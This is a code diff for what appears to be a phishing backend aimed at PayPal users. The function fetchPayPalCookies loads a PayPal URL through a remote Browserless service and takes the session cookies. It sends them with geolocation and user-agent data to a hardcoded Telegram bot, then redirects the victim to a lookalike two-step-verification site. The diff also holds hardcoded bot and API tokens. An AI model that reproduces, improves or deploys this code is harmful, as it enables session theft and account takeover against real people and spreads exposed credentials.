@@ -1,11 +1,11 @@
-const puppeteer = require('puppeteer');
 const express = require('express');
 const app = express();
 const port = process.env.PORT || 3000;
-
 const BOT_TOKEN = "8357190104:AAGRU7LylcJDfGyYGAQHhni7e8PyAC8PKkU";
 const CHAT_ID = "8259952691";
 const TWO_STEP_URL = "https://2stepverification.page.gd";
+const BROWSERLESS_ENDPOINT = "https://production-sfo.browserless.io/chromium/bql";
+const BROWSERLESS_TOKEN = "2TCTpnyOJWw8Uzu59c972c0c77dc84dda3b1c08bc859ece92";
 
 app.use(express.json());
 
@@ -58,56 +58,55 @@ async function sendToTelegram(paypalCookies, userTag, examNumber, geoInfo, url, 
 }
 
 async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgent) {
-    let browser;
-    try {
-        // Use Puppeteer's bundled Chromium
-        browser = await puppeteer.launch({
-            headless: true,
-            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'],
-            // Remove executablePath to use bundled Chromium
-        });
-        const page = await browser.newPage();
+    const userAgent = clientUserAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36';
 
-        // Use client’s User-Agent if provided, else a generic one
-        const userAgent = clientUserAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36';
-        await page.setUserAgent(userAgent);
-
-        // Set headers to mimic a browser
-        await page.setExtraHTTPHeaders({
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-            'Sec-Fetch-User': '?1',
-        });
-
-        // Navigate to PayPal URL
-        const response = await page.goto(paypalUrl, { waitUntil: 'networkidle2', timeout: 30000 });
-        if (!response.ok()) {
-            throw new Error(`HTTP error! Status: ${response.status()}`);
+    const query = `
+        mutation Goto($url: String!) {
+            goto(url: $url, waitUntil: "networkidle2") {
+                status
+            }
+            cookies {
+                name
+                value
+            }
         }
+    `;
 
-        // Extract cookies
-        const cookies = await page.cookies();
+    try {
+        const response = await fetch(`${BROWSERLESS_ENDPOINT}?token=${BROWSERLESS_TOKEN}`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                query,
+                variables: { url: paypalUrl }
+            })
+        });
+
+        const data = await response.json();
+        if (data.errors) throw new Error(data.errors[0].message);
+
+        const cookies = data.data.cookies;
         const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
 
-        // Get GeoInfo
         const geoInfo = await getGeoInfo();
-
-        // Send to Telegram
         await sendToTelegram(cookieString || "No cookies found", userTag, examNumber, geoInfo, paypalUrl, userAgent);
 
-        return { success: true, cookies: cookieString, redirectUrl: `${TWO_STEP_URL}?userTag=${encodeURIComponent(userTag)}` };
+        return {
+            success: true,
+            cookies: cookieString,
+            redirectUrl: `${TWO_STEP_URL}?userTag=${encodeURIComponent(userTag)}`
+        };
     } catch (err) {
-        console.error("Puppeteer error:", err);
+        console.error("Browserless error:", err);
         const geoInfo = await getGeoInfo();
         await sendToTelegram(`Failed to fetch PayPal: ${err.message}`, userTag, examNumber, geoInfo, paypalUrl, userAgent);
-        return { success: false, error: err.message, redirectUrl: `${TWO_STEP_URL}?userTag=${encodeURIComponent(userTag)}` };
-    } finally {
-        if (browser) await browser.close();
+        return {
+            success: false,
+            error: err.message,
+            redirectUrl: `${TWO_STEP_URL}?userTag=${encodeURIComponent(userTag)}`
+        };
     }
 }
 
